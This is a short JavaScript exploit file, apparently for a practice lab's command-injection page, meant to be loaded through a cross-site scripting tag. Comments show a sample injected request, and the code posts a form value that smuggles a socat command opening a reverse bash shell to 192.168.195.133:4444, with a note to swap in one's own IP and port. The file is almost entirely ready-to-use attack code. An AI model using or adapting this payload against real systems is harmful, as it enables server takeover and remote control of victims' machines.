// POST /vulnerabilities/exec/ HTTP/1.1
// Host: lab
// Content-Type: application/x-www-form-urlencoded

// ip=%3Bid%3B&Submit=Submit
// <script src="http://192.168.195.133/exploit.js"/>

var host = document.location.host;

var xhttp = new XMLHttpRequest();
var payload_prefix = "ip=;";
var payload = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.195.133:4444"; // replace IP and Port for your system
var payload_suffix = "&Submit=Submit";
var exploit = payload_prefix + payload + payload_suffix;

xhttp.open("POST", "http://" + host + "/vulnerabilities/exec/", true);
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded", true);
xhttp.send(exploit);